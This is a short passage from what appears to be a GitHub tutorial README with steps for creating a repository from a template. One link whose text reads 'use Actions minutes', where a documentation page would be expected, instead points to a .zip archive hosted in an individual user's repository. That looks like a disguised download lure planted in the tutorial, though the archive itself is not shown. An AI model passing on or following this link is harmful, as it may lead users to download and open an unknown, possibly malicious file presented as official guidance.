2. In the new tab, most of the prompts will automatically fill in for you.
   - For owner, choose your personal account or an organization to host the repository.
   - We recommend creating a public repository, as private repositories will [use Actions minutes](https://github.com/Stevenj24/introduction-to-github/raw/refs/heads/main/images/github_introduction_to_3.8.zip).
   - Scroll down and click the **Create repository** button at the bottom of the form.
